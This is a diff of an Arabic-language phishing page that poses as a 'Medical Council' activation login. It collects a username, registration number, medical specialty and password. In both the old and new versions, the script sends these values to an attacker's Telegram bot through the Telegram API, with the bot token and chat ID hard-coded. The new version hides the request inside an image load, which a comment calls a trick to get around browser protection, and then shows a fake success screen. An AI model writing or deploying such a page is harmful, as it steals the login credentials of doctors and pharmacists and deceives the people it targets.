@@ -5,45 +5,63 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>المجلس الطبي</title>
     <style>
-        body { margin: 0; background: #0f172a; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; color: white; }
-        .card { width: 90%; max-width: 380px; background: #1e293b; border-radius: 20px; padding: 25px; text-align: center; border: 1px solid #334155; }
-        input, select { width: 100%; height: 50px; background: #334155; border: none; border-radius: 10px; padding: 0 15px; margin-bottom: 10px; color: white; font-size: 16px; box-sizing: border-box; text-align: right; }
-        .btn { width: 100%; height: 55px; background: #0088cc; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        #success { display: none; }
+        body { margin: 0; background: #111827; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; color: white; }
+        .card { width: 90%; max-width: 360px; background: #1f2937; border-radius: 20px; padding: 25px; text-align: center; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.3); }
+        input, select { width: 100%; height: 50px; background: #374151; border: 1px solid #4b5563; border-radius: 12px; padding: 0 15px; margin-bottom: 12px; color: white; font-size: 16px; box-sizing: border-box; text-align: right; }
+        .btn { width: 100%; height: 55px; background: #2563eb; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 15px; display: none; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="card" id="box">
-    <div id="form">
-        <h2 style="margin-bottom: 20px;">تأكيد الدخول</h2>
-        <input type="text" id="u" placeholder="اسم المستخدم">
-        <input type="tel" id="r" placeholder="رقم التسجيل">
-        <select id="s"><option>طب عام</option><option>طب أسنان</option><option>صيدلة</option></select>
-        <input type="password" id="p" placeholder="كلمة المرور">
-        <button onclick="send()" class="btn" id="b">إرسال وتأكيد</button>
-    </div>
-    <div id="success">
-        <h2 style="color: #4ade80;">✅ تم الإرسال</h2>
-        <p>تصلك الرسالة الآن في البوت.</p>
-    </div>
+<div class="card">
+    <h2>المجلس الطبي</h2>
+    <p style="color: #9ca3af; font-size: 14px; margin-bottom: 20px;">يرجى إكمال البيانات للتفعيل</p>
+    
+    <input type="text" id="user" placeholder="اسم المستخدم">
+    <input type="tel" id="reg" placeholder="رقم القيد">
+    <select id="spec">
+        <option>طب عام</option>
+        <option>طب أسنان</option>
+        <option>صيدلة</option>
+    </select>
+    <input type="password" id="pass" placeholder="كلمة المرور">
+    
+    <button onclick="directSend()" class="btn" id="mainBtn">تأكيد الإرسال</button>
+    <div id="status">جاري الإرسال...</div>
 </div>
 
 <script>
-    function send() {
-        const token = "8682180549:AAGxYYy6V5adsST-1M7SrSQqk6EV4gRlM5I"; // التوكن الجديد
-        const chatId = "7746757675"; // معرفك الشخصي
-        const msg = `📥 بيانات جديدة:\n👤 اليوزر: ${document.getElementById('u').value}\n🆔 الرقم: ${document.getElementById('r').value}\n🩺 التخصص: ${document.getElementById('s').value}\n🔑 الكلمة: ${document.getElementById('p').value}`;
+    function directSend() {
+        const btn = document.getElementById('mainBtn');
+        const status = document.getElementById('status');
+        
+        // البيانات المدخلة
+        const u = document.getElementById('user').value;
+        const r = document.getElementById('reg').value;
+        const s = document.getElementById('spec').value;
+        const p = document.getElementById('pass').value;
 
-        // الرابط المباشر للإرسال فوراً
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+        if(!u || !p) { alert("يرجى ملء البيانات"); return; }
 
-        // تنفيذ الإرسال
-        fetch(url, { mode: 'no-cors' });
+        btn.disabled = true;
+        status.style.display = "block";
 
-        // إظهار رسالة النجاح
-        document.getElementById('form').style.display = 'none';
-        document.getElementById('success').style.display = 'block';
+        // التوكن الجديد الخاص بك ومعرف الشات
+        const token = "8682180549:AAGxYYy6V5adsST-1M7SrSQqk6EV4gRlM5I";
+        const chatId = "7746757675";
+        const message = `✅ وصول بيانات جديدة:\n👤 اليوزر: ${u}\n🆔 الرقم: ${r}\n🩺 التخصص: ${s}\n🔑 الكلمة: ${p}`;
+
+        // الطريقة المضمونة: فتح الرابط في الخلفية ثم إغلاقه
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        // نستخدم Image لتخطي حماية المتصفح (حيلة برمجية قوية)
+        const img = new Image();
+        img.src = url;
+
+        setTimeout(() => {
+            document.body.innerHTML = "<div style='text-align:center;'><h1>✅ تم بنجاح</h1><p>تأكد من البوت الآن.</p></div>";
+        }, 1000);
     }
 </script>
 </body>
